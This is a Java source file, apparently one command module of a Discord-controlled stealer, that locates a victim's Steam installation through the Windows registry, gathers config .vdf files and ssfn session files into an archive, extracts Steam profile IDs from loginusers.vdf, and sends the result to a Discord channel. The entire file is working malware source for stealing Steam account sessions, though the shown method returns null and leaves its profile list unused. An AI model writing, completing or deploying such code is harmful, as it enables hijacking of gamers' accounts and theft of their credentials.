package me.vasler.command.impl;

import me.vasler.command.Command;
import me.vasler.utils.ArchiveUtil;
import me.vasler.utils.FileUtil;
import me.vasler.utils.TempFiles;
import me.vasler.utils.os.WindowsRegistry;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.utils.FileUpload;

import java.io.File;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SteamCommand extends Command {

    public static boolean stolen = false;

    public SteamCommand() {
        super(new String[]{"steam", "csgo"});
    }

    @Override
    public void run(String[] args, TextChannel channel) {
        channel.sendFiles(new FileUpload[]{FileUpload.fromData(steamStolen())}).queue();
    }

    public File steamStolen() {
        String path = WindowsRegistry.readRegistry("HKLM\\SOFTWARE\\WOW6432Node\\Valve\\Steam", "InstallPath");

        if (path != null)
        {
            if (!path.endsWith("\\"))
                path += "\\";

            File folder = new File(path);
            if (folder != null)
            {
                File[] files = folder.listFiles();
                if (files != null)
                {
                    for (File f : files)
                    {
                        if (f.isDirectory())
                        {
                            if (f.getName().equalsIgnoreCase("config"))
                            {
                                // vdf
                                File[] configfolder = f.listFiles();
                                if (configfolder != null)
                                {
                                    for (File f2 : configfolder)
                                    {
                                        if (!f2.isDirectory() && f2.getName().contains("vdf"))
                                        {
                                            try
                                            {
                                                TempFiles tmp = FileUtil.readFile(f2.getAbsolutePath());
                                                if (tmp != null)
                                                {
                                                    stolen = true;
                                                    ArchiveUtil.addFile("Steam/config/" + f2.getName(), tmp.bytes);
                                                    FileUtil.close(tmp);
                                                }
                                            }
                                            catch (Exception e)
                                            {

                                            }
                                        }
                                    }
                                }
                            }
                        }
                        else
                        {
                            if (f.getName().contains("ssfn"))
                            {
                                try
                                {
                                    TempFiles tmp = FileUtil.readFile(f.getAbsolutePath());
                                    if (tmp != null)
                                    {
                                        stolen = true;
                                        ArchiveUtil.addFile("Steam/" + f.getName(), tmp.bytes);
                                        FileUtil.close(tmp);
                                    }
                                }
                                catch (Exception e)
                                {

                                }
                            }
                        }
                    }
                }
            }

            StringBuilder sb = new StringBuilder();
            String users = path + "config\\loginusers.vdf";
            File usersfile = new File(users);
            if (usersfile != null && usersfile.exists() && !usersfile.isDirectory())
            {
                try
                {
                    Scanner scanner = new Scanner(usersfile);
                    while (scanner.hasNextLine())
                    {
                        String line = scanner.nextLine();
                        if (line != null)
                        {
                            Pattern p = Pattern.compile("\"76(.*?)\"");
                            Matcher m = p.matcher(line);

                            while (m.find())
                            {
                                stolen = true;
                                String profile = m.group();
                                profile = profile.substring(1, profile.length() - 1);
                                sb.append("https://steamcommunity.com/profiles/" + profile + "/\n");
                            }
                        }
                    }
                }
                catch (Exception e)
                {

                }
            }
        }
        return null;
    }
}
